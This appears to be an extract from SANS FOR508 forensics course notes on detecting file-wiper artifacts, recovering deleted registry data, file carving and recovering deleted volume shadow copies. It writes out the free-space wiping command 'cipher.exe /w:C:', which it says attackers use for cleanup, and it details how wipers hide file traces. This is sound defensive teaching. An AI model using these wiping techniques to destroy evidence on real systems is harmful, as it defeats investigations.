Windows Search gather queue.[2] Through this process, we can leverage the gather logs effectively as a backup
to the USN journal, at least for files that are in directories to be indexed (primarily in users’ profile directories).
86

© 2023 SANS Institute

.

86

On the bottom-left, we see a screenshot of an entry from the $I30 index slack space. This filename had been
deleted and overwritten, yet we see the file’s 8.3 short name, MFT record number (47736, which corresponds to
the UsnJrnl), and timestamps.
To the bottom-right is a screenshot of parsing the prefetch file for SDelete. Prefetch tells us SDelete ran 11
times. One of those times corresponds exactly with the times in the USN journal when the Nokia Strategy.docx
name changed (repeatedly). Further down in the parsed prefetch data, we get to a list of files accessed by
sdelete.exe in the first 10 seconds of execution. Since SDelete a command-line tool and doesn’t begin executing
until the user presses Enter, and part of the command line is to specify files or directories to wipe, it’s nearly
guaranteed that some of the files targeted by SDelete for wiping will be included in the list of files accessed by
SDelete in the first 10 seconds.
This is a nice set of artifacts that remain after the file wiper has run, and this is not even an exhaustive list.
We’ll look at some other potential artifacts next. Suffice it to say, however, that even if we’ve lost access to the
file itself, we still have significant evidence showing the intent to remove data through file wiping.

.

[1] SDdelete documentation: https://for508.com/a10bu
[2] Wikipedia article on Windows Search: https://for508.com/nbvwi

© 2023 SANS Institute

.

87

Characteristics of Other Popular Wipers

BCWipe

Commercial multi-platform tool designed for enterprises

• Licensed product with many configuration options
• Testing shows it effectively clears $I30 slack and MFT records
• Renames files once with a random name equal in size to original
• $UsnJrnl, $LogFile, and “Evidence of Execution” artifacts persist

Eraser

MFT overwrite via rename

MFT reuse via file create

Open-source tool for sanitizing files or disks

• One of several options recommended by US-CERT for data sanitizing
• Includes an option to use a “legitimate” filename prior to final deletion
• Renamed MFT records (with ADS, if present), $I30 slack, $UsnJrnl,
$LogFile, and “Evidence of Execution” artifacts persist

Cipher

Original filename!

Built-in cryptography utility for Windows

• Designed primarily for encryption via EFS, but also includes a feature to overwrite free space (not individual files)
• “LOLbin” sometimes used for cleanup (somewhat common with ransomware)
• Use cipher.exe /w:<drive> to implement built-in free-space wiping
• Cipher creates a persistent directory named EFSTMPWP at the volume root and adds temp files within it to fill free space

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Beyond SDelete, there are of course a number of other data wiping solutions available. Here we list a few of the
more common wiping tools. The first two, BCWipe and Eraser, are similar to SDelete in their functionality.
The third one, cipher.exe, is actually an encryption utility bundled in Windows, but can also be used to wipe free
space on the volume. We'll discuss each of these to get a sense of how they operate. We also provide some test
results to discover common "tool markings" that may help spot their presence on subject systems.
Note that our tests did not include examination of the data layer. It is assumed that the tools were effective at
overwriting the clusters of the active version of the file. That said, it’s not a guarantee that these tools were truly
able to overwrite all data of the active file, as there can be a number of challenges in doing so.[1] One wellknown challenge in data wiping is with SSDs, due to their use of wear-leveling technology.[2,3] Nevertheless,
our tests focused primarily on finding evidence that the target file existed. Depending on the investigation,
simply knowing that a file of interest existed at all may be just as important as knowing what was in it.
Looking at BCWipe first, this is a popular data sanitizing solution. It is commercial, and thus requires a licensed
version to function. Although time-limited trial versions are available for free, they still require a trial license to
run. Overall, BCWipe is the most thorough of the tools we tested. They claim on their website that “BCWipe
enables you to permanently wipe files selectively so that they can never be recovered or undeleted.” Of course,
we know there are various possibilities to recover wiped data, including volume shadow copies and temporary
versions of files, to name a couple. However, BCWipe does do a decent job of clearing traces of wiped files.
The features list from their website is extensive. Here are a few features specifically for file wiping:[1]
•
•
•
•

Wipe File Slack
Wipe MFT Records & Directory Entries
Wipe Directory Slack Space on NTFS Drives
Wipe Temporary Data Stored in NTFS Log File

88

© 2023 SANS Institute

.

88

.

BCWipe was the most effective tool we tested, but still showed leaked information, particularly in both of the
NTFS journal logs. Interestingly, they claim on their website to “Wipe Temporary Data Stored in NTFS Log
File”. Although it was relatively quiet in the $LogFile, it still contained a single entry with the original target
file names of our test files. For comparison’s sake, the $LogFile from SDelete had 3 entries as a result of the file
wipe operation. The $UsnJrnl is not addressed by BCWipe according to the website’s feature list, and that was
evident in testing. There were many entries related to the file wiping activity, as we show below. In a very
short timeframe, we see a lot of interesting activity related to BCWipe’s behavior. Let’s deep-dive this $UsnJrnl
output from a run of BCWipe to get a better understanding of how this tool works, and how wipers work in
general. We show on the screenshot several steps in the “BCWiping” process and annotate these steps below.

1. In the first two rows, we see the USN journal’s signature of a rename for the target file named “Q4Results_CONFIDENTIAL.pdf”, MFT entry number 28379. We see the name changed to a long random
name of an equal number of characters (27). This process overwrites the original name (and other metadata)
so the original cannot be discovered from analyzing deleted MFT records. Deletion is the next step.

© 2023 SANS Institute

.

89

.

2. The final action on the target file was a FileDelete. Notice a few rows up were several DataOverwrite
events, indicating the data-layer wiping. There is also are StreamChange events to signify deletion of the
ADS for this file. With the final action we’ve marked as #2, the file has been wiped and deleted.
3. BCWipe goes further to try to erase the presence of this file. The next step it takes is creating a hidden
directory named “~BCWipe.tmp” (potentially a good IOC) using the same MFT entry number as the targeted
file (28379). Notice the FileAttributes column on the far-right flags this as a directory first, then a
BasicInfoChange to update the attributes to hidden. The significance of this new directory being created in
the same MFT entry number 28379 is that it accomplishes fully overwriting the metadata of the target file.
The parent MFT entry of this new ~BCWipe.tmp directory is 5, which is always the root of the volume.
4. Next, we see a series of files created with a name of SECRET.txt followed by many exclamation marks (!!!)
and then a final character that changes for each new file. At the top-right of the screenshot, we see the full
name of one entry, and in this instance, it ended with the percent sign (%). If you’re curious, there were 223
characters in the filename for each of these new files. For context, SECRET.TXT is the name of another test
file that resided in the same directory as the target file. What we’re seeing here is an effort to create several
new entries that will fill up space in the $I30 directory indexes of the parent directory of our target file
(parent directory entry 67191).
--As a side note here, notice that the MFT entry numbers of the new “SECRET.TXT!!!...” files are
increasing sequentially (at least for the first 5 out of 6). This is an example Windows’ tendency to pick the
next available MFT entry number when creating new files. When many are created quickly, this is
commonly the effect.
5. A new directory named “BCW-DIR-NODES” is created next. It will become the parent of the new
“SECRET.TXT!!!...” files, perhaps in an effort to remove at least some of the suspicious looking directory
entries from the parent of the targeted file.
6. The final step we show in the screenshot is a move and rename of one of the “SECRET.TXT!!!...” files.
Notice the MFT entry number 29057 does not change for the file, but both its name and parent MFT entry
number do change. Its parent moves to BCW-DIR-NODES (parent MFT entry 29108). The name “dir1”
sounds like a directory name, but it is not. The screenshot doesn’t show all the attributes, but none of them
indicate it as a directory. There were 6 “SECRET.TXT!!!...” files created and each one is renamed (e.g.,
dir1, dir2, dir3, etc.) and moved to BCW-DIR-NODES. After they are moved, they are deleted and then
BCW-DIR-NODES is deleted. You may have noticed that the parent of BCW-DIR-NODES was
~BCWipe.tmp. That directory was also deleted, but just before doing so, a new file named
“LOGFILEWIPER” was created inside it. The purpose of that file is unknown, but it’s certainly an
interesting filename. Another conspicuous file creation was SWP_INSBCB.tmp which inherited the original
target file’s MFT entry of 28379, and generated hundreds of DataExtend|DataTruncation events in the
$UsnJrnl. Eventually, the flurry ended with a prefetch file creation of INSBCBUS.EXE-78A69D45.pf.
That’s a lot of activity to wipe one file! In total, there were just under 1700 entries in the $UsnJrnl spanning 8
seconds. BCWipe does a lot to hide the existence of its targeted files, but NTFS does a lot as well to track that
activity. In the end, we observed BCWipe consistently removing traces of the target file from the $MFT and the
$I30 directory indexes. However, both the $UsnJrnl and $LogFile showed evidence of the original name and
the final fate of the file. We also found artifacts in the standard “evidence of execution” locations, such as
prefetch. Here’s a clear example of a target file’s random name change, immediately followed by the temporary
directory structure observed in the example above.

90

© 2023 SANS Institute

.

Next, we take a look at Eraser. This is a common open-source wiping tool that has been around since 2003. It
has been recommended by numerous organizations, including US-CERT.[4] Like BCWipe, Eraser also was
found to have exposure in the NTFS journals. Unlike BCWipe, it was not able to clear deleted entries in the
slack of $I30 directory indexes. Testing found at least one instance of a deleted file in the parent index,
although it was after renaming to a random file name.

.ir

Another gap was that Eraser did not fully erase the MFT record for the target file. The file was renamed, so it
was not possible to determine the original name from the MFT record alone. However, a big exposure was that
the Zone.Identifier ADS for the wiped files was left untouched. In our tests, the Zone.Identifier still had the
URL where the file originated from, often including the original file name (e.g., plaso-20190331-amd64.zip).
For example, here we see several files deleted from a folder in Downloads, and each one had its ADS unaltered.

hi

de

01

Eraser did rename files prior to deletion, as virtually all wipers will do. It also changed the timestamps, as we
get a glimpse of in the screenshot above. Notice the Date Modified is set to January 1, 1601. This is an indicator
of a Windows 64-bit timestamp zeroed out. Eraser overwrote all the timestamps (both $SI and $FN) with a null
value. However, making that change (and likely others) did cause the MFT entry change (C) time to get updated
for the $STANDARD_INFORMATION attribute. So, the “C” time was consistently valid in testing, where all
others were dated January 1, 1601.
Eraser by default renames the file 7 times prior to deletion. This is a holdover from an old U.S. Department of
Defense standard for a 7-pass wipe.[5] Most experts agree that a single pass is sufficient for modern magnetic
hard drives due to their density.[6] Ironically, the 7 passes is not only unnecessary, but it also causes the NTFS
journals to look even more suspicious than would be the case for a single name change. On the other hand,
Eraser includes an option to use a real file name as the final name change prior to deletion in order to appear
more legitimate. This would be useful since the unallocated MFT records persist after deletion with Eraser.
Let’s consider one more option adversaries may use to wipe data—the Windows built-in tool cipher.exe. This a
convenient and under-the-radar option because it’s available by default on Windows all the way back to
Windows 2000.[7] This tool is designed to support various tasks of the Encrypting File System (EFS), including
clearing free space. The tool’s help description says it: “Displays or alters the encryption of directories [files]
on NTFS partitions.” Most of the options (and there are many) deal with encrypting files or handling keys and
certificates. However, when encrypting files, it’s important to be able to securely erase the original data. So
that’s a key feature of cipher.exe too. The one command-line switch to use for this is “/w:”, which is used to
wipe free space on the volume. A typical invocation would be “cipher.exe /w:C:”.
Since cipher.exe doesn’t directly work to hide the existence of files, its profile in the NTFS artifacts such as the
USN journal is not as interesting as the other tools discussed. Certainly, nothing like we saw with BCWipe!
However, there are some indicators of its use. In the journals, we’ll find a directory named “EFSTMPWP”
created in the root of the volume the first time it’s run against that particular volume. While the tool performs its
cleansing, several temporary files are created to fill the volume with data to overwrite free space.[8] In our tests,
the files were of the format “fil<xxxx>.tmp”, where <xxxx> was 4 pseudorandom alphanumeric values, and
“<x>.E”, where <x> was an increasing number beginning at 0 (zero). When finished, the temporary files were
deleted, but the EFSTMPWP directory remained. Tested systems included Windows 10, Server 2016, and
Server 2012R2. A reboot was performed following each test to ensure the directory persisted after a reboot.
© 2023 SANS Institute

.

91

This is contrary to several online articles discussing cipher.exe’s use of EFSTMPWP. They often say this is a
temporary folder that will be deleted once the program completes. However, from 5 tests across different
operating systems, as well as virtual and physical installations, we did not find this to be the case. This may be
significant, as it could serve as a useful indicator of compromise. Specifically, any indication of EFSTMPWP
that is unexpected (i.e., EFS is not in use) should be considered a suspicious sign of cipher running on the
system.
Beyond the file system, our core “evidence of execution artifacts” are once again excellent indicators of cipher’s
use. If cipher has been used, it will populate both locations. Because cipher doesn’t run directly against files, it
will not be obvious what data was overwritten. For example, the parsed file list from cipher’s prefetch file is
quite bland. The typical use case by attackers is to delete key files through normal methods, and then as a final
clean-up step, run cipher.exe. Therefore, journal and timeline analysis is recommended over a longer view to
determine files and directories that were deleted and eventually wiped with cipher.exe.

.

[1] BCWipe features page: https://for508.com/j-i45
[2] Data erasure limitations: https://for508.com/lwh6q
[3] Securely erase a solid-state drive : https://for508.com/095x2
[4] US-CERT “Disposing of Devices Safely”: https://for508.com/i9cqn
[5] 7-pass wipes: https://for508.com/yrdg8
[6] NIST "Guidelines for Media Sanitization”: https://for508.com/6kd90
[7] Cipher.exe for the Encrypting File System: https://for508.com/l8htd
[8] EFSTMPWP folder’s use: https://for508.com/9s2hr

92

© 2023 SANS Institute

.

Registry Key/Value “Records” Recovery
• Registry hives have unallocated
space similar to filesystems
• A deleted hive key is marked as
unallocated; possible to recover
• Keys
• Values
• Timestamps

Numerous keys
and values
easily recovered
following a run
of BleachBit
privacy cleaner

• Eric Zimmerman’s Registry
Explorer makes recovering
deleted registry data trivial
Similar effect with CCleaner
and other privacy cleaners

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

93

.

In the realm of Windows investigations, we’d be remiss if we didn’t discuss the registry. The registry is
essentially a database with its own set of records, in the form of keys and values. Like other databases, when
records are deleted, they are just marked deleted. The data is not immediately overwritten and typically
available for some time, generally until the space is reused for new records, or a compaction routine runs. Of
course, this opens the door to recovering deleted registry data. There are many reasons to do so, including
finding evidence of users running privacy cleaners or uninstalling programs in an effort to cover their tracks.
Several tools are available that can present deleted keys and values. Eric Zimmerman’s Registry Explorer has
many helpful features for registry analysis, not the least of which is presenting deleted entries in an easy to
review format. In the screenshot on the slide, we see deleted records from a user’s NTUSER.DAT following the
execution of a popular privacy cleaner named BleachBit. Like many privacy cleaners, it goes after some of our
prime areas for registry analysis, including WordWheelQuery (keyword searches), UserAssist (GUI applications
launched), ComDlg32 (use of the Open/Save dialog box), and RecentDocs (most recently opened files). Testing
of CCleaner, another popular privacy cleaner, shows similar activity.
Deleted keys usually will still carry much information relevant to a case (items such as timestamp information
and values). If a key is recoverable, there is a good chance the associated data will also be able to be recovered
as well.[1]
Wiping of registry data is not common but is possible. Research has shown that in certain situations, the data
that was present prior to the overwrite can be recovered from registry transactional logs.[2] This data may stay in
the transactional logs for days or even weeks, depending on the activity level of the system, as well as a lack of
major changes such as Windows updates. Furthermore, copies of both the registry files and their transaction
logs are stored in volume shadow copies, providing analysts with even greater ability to recover overwritten—or
simply deleted—data from the registry.
[1] "Forensic Analysis of Unallocated Space in Windows Registry Hive Files“: http://for500.com/0g5-v
[2] “Digging Up the Past: Windows Registry Forensics Revisited”: https://for508.com/5sbal

© 2023 SANS Institute

.

93

Finding “Fileless” Malware in the Registry

• Attackers try to hide amongst the noise in the registry
• Registry Explorer has convenient features to spot anomalies
• Detect large values
• Detect Base64
values

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Sometimes our difficulty in recovering data from the registry is not because it was deleted, but because it is
hiding amongst hundreds of thousands of other items in the registry. Attackers have used this fact to their
advantage by tucking away malicious payloads in hard-to-find registry locations. A common scenario is the
“fileless” malware technique of hiding malicious scripts, especially PowerShell scripts, that can serve as the
source for their command and control of the system. The script may be bundled with the PowerShell command
to launch it, or the script may be stored in a separate value to obscure it a bit more. In the slide’s screenshot, we
see a base64-encoded script which is called from a different location in the registry. This sample is an example
of the script being stored separately from the launching mechanism, which was stored in the Run key and further
obfuscated by calling %COMSPEC% prior to starting PowerShell. %COMSPEC% is a variable for cmd.exe.
Read more about this sample and others in Mari DeGrazia’s excellent blog series “Finding and Decoding
Malicious PowerShell Scripts”.[1]
A great set of features reside in Eric Zimmerman’s Registry Explorer tool to help bubble up suspicious payloads
such as this. The screenshot on the left shows part of Registry Explorer’s “Find” feature. Pictured are the
abilities to search specific components of the registry, including key & value names, value data, and even value
slack space. “Value slack” is the unused space from the end of the value data to the end of the cell.[2] It includes
both simple string searching as well as regular expression searching. Not shown is the ability to filter on time
ranges as well. Most pertinent to this example is the ability to filter results by minimum value size or presence
of base64 data of a certain size. In most cases, the default sizes are reasonable starting points to find malicious
scripts hiding in the registry. There will likely be false positives to navigate, but the results can be sorted by
time, helping to prioritize recent changes.
* Special thanks to Mari DeGrazia for permission to use the PowerShell payload screenshot in our slide!
[1] Mari DeGrazia’s “Malicious PowerShell in the Registry: Persistence”: https://for508.com/w08bz
[2] Windows Registry Forensics: Advanced Digital Forensic Analysis of the Windows Registry, 2nd Ed by
Harlan Carvey, pg 48

94

© 2023 SANS Institute

.

94

File Recovery: Metadata Method vs. Carving Method
Files to Target?
Generally, case-dependent
Link files
Jumplists
Recycle Bin
Web history

Metadata Method

➢ When a file is deleted, its
metadata is marked unused,
but metadata remains
➢ Read metadata entries that
are marked as deleted and
extract the data from any
clusters it points to

VS.

Carving Method

➢ If the metadata entry has
been reused, the data may
still reside on disk, but we
have to search for it
➢ Use known file signatures to
find the start, then extract the
data to a known file footer or
to a reasonable size limit.

Prefetch
Binaries
Scripts
Archives

Office docs
CAD drawings
Email stores

Images
Videos

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

95

Whether data wiping is in play or not, we are almost always interested in some level of deleted data recovery.
Options range from the simple to the complex. We’ll begin with a look at whole file recovery and then look at
more specialized recovery options.

.

There are two primary ways to recover whole deleted files from a volume. The best option, if available, is to
use file system metadata which has simply marked a file as deleted, but the metadata describing the file and
pointing to it data is still available. Assuming the clusters were not reused, this will result in recovering the
whole file exactly as it existed prior to deletion. The second option is necessary if the file system metadata has
been overwritten. In this case, we turn to file “carving”, which uses file signatures of well-known file types to
locate deleted files in the volume’s unallocated clusters.
With file carving, our tools are typically configured to scan for known file signatures at the start of clusters and
“carve” (extract) a file’s data when the signature is located. A file signature (aka “magic number”) is a
sequence of bytes at the beginning of the file that are unique to each file type. For example, Windows
executables have a value that starts with 0x4d5a9000 (the first two bytes of which are the telltale “MZ” ASCII
characters). When a file carver is configured to recover executables, it looks for that exact sequence at the start
of the unused clusters and then extracts data based on a configured max length for that file type, or until a
known footer for the file type is found.
The file carving process can be subject to many false-positives, depending on what is being searched for, and
where. For example, due to the highly fragmented nature of solid-state drives, carving for full files from SSD
unallocated space will often lead to a lot of partial-file recoveries. The same is true of carving for files from a
memory image (even more so in fact). On mechanical drives, however, the results tend to be more reliable.
File carving is by no means a starting point in your investigation. It can be a very time-consuming process. And
not just the carving, but also the review! It’s important to have a good understanding of the case and target only
the file types that would be especially relevant for the current investigation.
With that said, there are likely a few file types that will be pertinent to just about any Windows-based
investigation. These are mostly OS files, such as shortcut files (.lnk), prefetch files (.pf), and Recycle Bin
metadata files ($I). Executables often fall in this category as well, of course especially for intrusion cases.
© 2023 SANS Institute

.

95

hi

de

01

.ir

From there, we generally select a few additional files based on the case type. For many investigations, including
network intrusions, we’re looking for evidence not only of deleted processes, but also scripts and archives can
certainly be of interest (encrypted archives are often used for exfil and/or for downloading tools surreptitiously).
Perhaps even looking for signs of collected and deleted exfil files, such as office documents, spreadsheets, and
engineering design files. For child exploitation or corporate inappropriate Internet usage cases, images and
videos will likely be targeted.

96

© 2023 SANS Institute

.

File Recovery via Metadata Method
Extract deleted files individually with icat

• icat –r <image> inode
Extract all deleted files with tsk_recover

• tsk_recover <image> <output-directory>

Two tools from The
Sleuth Kit provide
simple deleted file
recovery from
metadata

• Multiple forensics
tools can locate MFT
entries marked deleted
and allow us to export
Deleted file recovery with FTK Ima ger
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

97

When files still have their metadata entries intact, we have the opportunity to easily extract them for analysis.
Many disk-based forensic tools will provide options for finding unallocated metadata entries and extracting the
data from the clusters they point to. Pictured in the slide are a couple of options from The Sleuth Kit and the
popular free FTK Imager tool.[1]

.

We’ve already introduced icat, which allows the analyst to specify a particular MFT entry number and by
default extract the primary $DATA stream. The other tool shown from The Sleuth Kit is called “tsk_recover”. [2]
There are several options available, but by default it identifies unallocated inodes (MFT entries) and extracts
them all to a specified output directory.
As simple as these tools make recovery, it should be mentioned that the metadata recovery process is not always
effective. The big caveat is that for a successful recovery, not only does the file’s metadata entry need to be
unused, but also the clusters where the file resided need to still be unused. Most forensic tools can crossvalidate the clusters to determine if another file has since allocated the file’s clusters. If so, you will likely see a
“realloc” or “reallocated” message from the tool for that file. However, perhaps only a subset of the clusters
were reused and a fragment of the deleted file can still be recovered, which could still be quite useful in some
situations.
[1] FTK Imager from AccessData: https://for508.com/to8-7
[2] “tsk_recover” man page: https://for508.com/dr9-v

© 2023 SANS Institute

.

97

File Recovery via Carving Method

• PhotoRec is an excellent (free) file carver
• Runs on Windows, Linux, & Mac
• Provides signatures for 300+ file types
• Leverages metadata from carved files

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

PhotoRec is a fantastic file carver, freely available for Windows, Linux, and Mac (and others). It has several
features to provide intelligent data recovery through “carving” for known file signatures. It supports a wide
variety of files types, currently estimated at more than 480 file extensions from about 300 file families (e.g.,
.exe, .dll, .sys, .scr, etc. are part of the file family for “exe – MS Windows executable”).[1]

.

In addition to it running on multiple operating systems, it also supports multiple file systems. The list includes
NTFS, FAT, ext2/ext3/ext4 file systems. It’s helpful for PhotoRec to have direct support for the file systems so
it can do a couple of things. First, it can determine the cluster size. This allows PhotoRec to examine only the
beginning bytes of a cluster for file signatures. This is a nice efficiency boost since files should usually start at
the beginning of clusters. It also cuts down on false-positives. The other thing it can do since it understands the
file system is read the metadata to determine which clusters are free and which are in use. We can then instruct
PhotoRec to carve just the free space, as shown in the bottom-right screenshot on the slide. It rarely makes
sense to carve for files in allocated space, since we can just export those files directly via the file system
metadata.
Another nice feature of PhotoRec is that once it recovers files, it will attempt to parse internal metadata for
useful information like the file’s original name and size. The size is especially useful because most file types do
not have a defined ending (“footer”) signature. So PhotoRec and similar carving tools have to guess what a
logical size would be for a file of that type and then extract to that size. However, since some file types can
document their file size in internal metadata, PhotoRec can leverage that information to extract the proper
amount of data. Another thing it can do is replace a generic file name for the recovered file (usually based on
the offset into the image where the file was found) with a real name stored in the file’s metadata. Office docs
and Windows executables are good examples of files where this is usually possible.
While PhotoRec is designed for general data recovery by anyone, it does have a few features that cater to
forensic analysts. For instance, we can run PhotoRec directly against raw disk images and even E01 forensic
images. The screenshot on the left is an example of running it directly on the image for the base-file server from
Stark Research Labs’ 2018 incident. Also note that a “/log” option is available and particularly useful for
forensics to record the location of the files recovered by PhotoRec.[2]

98

© 2023 SANS Institute

.

98

Before running PhotoRec, it’s important to have a game plan for which files would be most pertinent to the
investigation, as was discussed earlier. For Windows investigations, a typical baseline of file will often include
.lnk, .pf, and .exe to spot unusual file and process activity. Beyond that, there are many, many file types to
choose from with PhotoRec. These will generally be case-specific.
When PhotoRec completes its carving, there will be a directory or set of directories named recup_dir.1,
recup_dir.2, etc. The recovered files are not organized in any meaningful way, meaning file types will be
interspersed across the recovery directories. There are a few helper scripts available from the PhotoRec site to
help with re-organizing the files into per-extension folders.[3]

.

[1] PhotoRec Wiki: https://for508.com/09kcy
[2] PhotoRec Step-by-Step: https://for508.com/6wi7z
[3] File sorting PhotoRec output: https://for508.com/ycg1f

© 2023 SANS Institute

.

99

Recovering Deleted Volume Shadow Snapshots

• The ultimate files to
recover—VSS files!
• Shadow copy files from the
System Volume
Information folder can be
recovered
• vss_carver.py carves and
recreates volume shadow
snapshots from disk images
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

One of the amazing things about volume shadow copies is how extremely fast and easy it can be to recover
deleted files (or previous file versions) that may have been assumed lost. That said, we are somewhat limited in
the sense that these are truly a snapshot in time, and, furthermore, there will be a limited number of snapshots
available (at best). In some cases, attackers and malware such as ransomware will delete snapshots as part of
their standard course of operations. So, do we have any recourse in these cases? Actually, we just might!
As discussed earlier in an earlier section, snapshots are made up of a catalog file that tracks metadata about
captured snapshots, as well as a separate store file for each snapshot. These files are located in the System
Volume Information directory at the root of the volume. Well, since these are known file types, there’s the
possibility we can carve for them! A number of people have researched this in the past and there have been
capabilities to recover them.[1] However, in 2018 an open-source tool set was created by Minoru Kobayashi and
Hiroshi Suzuki which makes recovery more accessible. As stated in their 2018 Black Hat presentation:[2]
Our goal is to create a tool to restore files from deleted snapshots in the following situations:
• Snapshots that were automatically deleted due to lack of capacity.
• Snapshots that were deleted by attackers, ransomware, and so on.
[1] Deleted Shadow Copies: https://for508.com/8kft3
[2] 2018 Black Hat VSS Recovery presentation: https://for508.com/edgfu

100

© 2023 SANS Institute

.

100

Carving for Snapshots in the FOR508 SIFT
Step 1: Use vss_carver against the raw image
• # vss_carver -t RAW -i /mnt/ewf_mount/ewf1 -o 0 -c ~/vsscarve-basefile/catalog
-s ~/vsscarve-basefile/store
Step 2: Review (and possibly reorder) recovered VSCs
• # vss_catalog_manipulator list ~/vsscarve-basefile/catalog

Step 3: Present recovered VSCs as raw disk images
• # vshadowmount -o 0 -c ~/vsscarve-basefile/catalog -s ~/vsscarve-basefile/store

/mnt/ewf_file/ewf1 /mnt/vsscarve_basefile/

Step 4: Mount all logical filesystems of snapshot
• # cd /mnt/vsscarve_basefile/
• # for i in vss*; do mountwin $i /mnt/shadowcarve_basefile/$i; done

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

101

One of the more exciting aspects of this tool is that it’s extremely fast. Results depend on the image size of
course, but it’s not uncommon to carve a small image in 10 minutes or less!

.

The primary variable to determine whether carving for snapshots will be successful or not is how long ago was
it when the snapshots were deleted? Due to various factors, the longer the time of deletion, the less likely the
snapshot will be recoverable. One way to estimate the likelihood of recovering any snapshots is to check the
NTFS USN journal for recent store file deletions. We can do this by filtering on any files with a parent of the
System Volume Information directory. Exactly what determines “recent” will vary case-by-case, but this can
still give an analyst an idea as to how many snapshots were deleted recently, as well as exactly when they were
deleted (and via timeline analysis, what else occurred around that timeframe if the deletion was attacker
invoked).
If the deletion occurred very recently, there’s a higher likelihood of recovering the file the simple metadata
recovery method. The other option is to use traditional data carving techniques, looking for the known file
signature in free space. vss_carver is able to recover snapshots in both cases, if the data is still available in the
image.
One complication of recovering deleted snapshots is that the catalog file immediately removes references to the
snapshot upon deletion. Those references in the catalog file contain timestamps, and those timestamps are used
to determine the order of snapshots. Order is important because snapshots are differential, meaning they build
upon each other. So if an analyst attempts to mount an older snapshot but the order of snapshots is unknown,
the snapshot mount will likely fail because the tool can’t step through the different data accurately. The
vss_carver tool will attempt to guess the order based on the offset in the NTFS volume where snapshots are
allocated. This offset is maintained in recovered store file even though the timestamps are overwritten. This is
not a failproof process, but it works in many cases. In the other cases, the accompanying
vss_catalog_manipulator tool allows the analyst to manually reorder the recovered snapshots. You can use the
vss_catalog_manipulator tool to list available snapshots and the current order the tool has assigned them. It also
allocates “fake” timestamps, which are generated in hourly increments from the oldest known good timestamp
available in the catalog file. These timestamps are not real and therefore should not be trusted.

© 2023 SANS Institute

.

101

.

Once one or more snapshots have been recovered, the next step is to access the data in a usable manner. The
tool authors addressed this by providing a patch to the vshadowmount tool. With the patched version, the
analyst can specify the path to the reconstructed catalog and store files and then all the volume snapshots will be
available for analysis. We have provided this patched version in the FOR508 Linux SIFT VM.

102

© 2023 SANS Institute

.

Example Snapshot Recovery with vss_carver
Here we see the potential of VSS carving:

A server named
base-file had
14 active
volume shadow
copies at the
time of imaging.
After using
vss_carver, we
have 32 more
snapshots
available!
(46 in total)
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

103

Recovering snapshots from prior dates can be incredibly powerful and have huge ramifications for our
investigations. In some cases, we’ll be able to have a much clearer picture of what an attacker did on a
compromised system by recovering older versions of almost all the artifact types we’ve discussed in class so far.
In other cases, such as ransomware investigations, it could mean the difference between near-total data loss to
near-total data recovery for our organization or client. Powerful indeed!

.

Here we see the result of running vss_carver on a server named base-file from Stark Research Labs’ 2018
incident. Initial examination showed that the forensic disk image contained 14 active volume shadow copies.
After carving, we added 32 more for a total of 46! Wow! This server was configured to take 2 snapshots per
day. So, we likely have at least 16 more days of historical data. There’s no guarantee there aren’t gaps in the
recovered snapshots, so some snapshots may go back further in time. However, due to the differential nature of
snapshots, any gaps will likely break our ability to access data from snapshots taken prior to the gaps.
It should be noted that these results are not typical. Multiple variables come into play which affect the ability to
recover snapshots. Some of those include how long ago the snapshots were deleted, the type of drive in-use on
the system (HDD vs SSD), and the overall activity level of the system. Furthermore, even though vss_carver
may locate and appear to recover deleted snapshots, it does not guarantee that they are all usable. In the case
with the base-file server, not all recovered snapshots were usable, although many of them were.
One factor which could positively impact your ability to recover snapshots is if an attacker deleted some, but not
all snapshots. In such cases, the attacker may do this to cover their tracks, but try to avoid setting off alarms with
a more comprehensive deletion. In this situation, Windows will not show the deleted snapshot(s) as available,
but behind the scenes, it maintains the deleted snapshot store file(s) to maintain consistent access to prior
snapshots. This behavior is a ramification of the copy-on-write differencing scheme used by the VSS service.
So, in this situation, vss_carver doesn’t truly need to carve the snapshots, but instead can utilize allocated
snapshot store files which were saved for consistency purposes.[1]
[1] Maxim Suhanov’s “Things you probably didn’t know about shadow copies”: https://for508.com/vim4u

© 2023 SANS Institute

.

103

Stream Carving for Event Log and File System Records
• Potential to recover several
important record types
• NTFS records:
• MFT
• $I30
• $USNJrnl
• $LogFile

• Event log EVTX records
• Bulk Extractor is fast!
• This is “Bulk Extractor with
Record Carving” (aka
bulk_extract0r-rec), a forked
version with additional record
carvers for NTFS and EVTX logs
* bulk_extractor-rec can also be run at the command-line!
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

There are a number of tools (free and commercial) that perform stream-based records carving. A free option
that has been around for many years and is still very popular is Bulk Extractor from Simson Garfinkel. This is
quite an impressive tool in many ways. Its main goal is to scan input data very quickly to find “useful
information”. To do that, it’s designed to make full use of multi-core / multi-threaded systems. It’s also
designed to automatically detect compressed files, decompress them, and processes the decompressed data. It
processes the data with “scanners”, which are essentially carvers for specific file or data types. It will carve for
some file categories, as well as record types. Some built-in records it can collect include email addresses, IP
addresses, URLs, credit card numbers, and the like. There’s a lot more to Bulk Extractor, but we’ll refer readers
to the main Bulk Extractor wiki and user’s guide to learn more about it.[1][2] There are also many articles and
videos on using Bulk Extractor for data recovery.
For this discussion, we’ll focus on a specific use case, and, in fact, a specific fork of Bulk Extractor called “Bulk
Extractor with Record Carving” from Teru Yamazaki. This version has all the impressive carving features of
Bulk Extractor, plus it adds in a handful of important records carvers. Specifically, it adds the following:[3]
•
•
•
•
•
•

evtx - EVTX file and EVTX chunks (with generated file header)
ntfsindx - INDX records of $INDEX_ALLOCATION attribute
ntfslogfile - RSTR/RCRD records of $LogFile
ntfsmft - FILE records of $MFT
ntfsusn - USN_RECORD structure of $UsnJrnl:$J
utmp - utmp structure records

These artifacts, particularly the first 5, are directly aimed at Windows investigations. Each one—from the 4
NTFS artifacts to the EVTX artifact—has the potential to lead to game-changing discoveries in an investigation.
The last one, utmp, is for carving for logs from Linux/Unix systems that detail login and logout information.
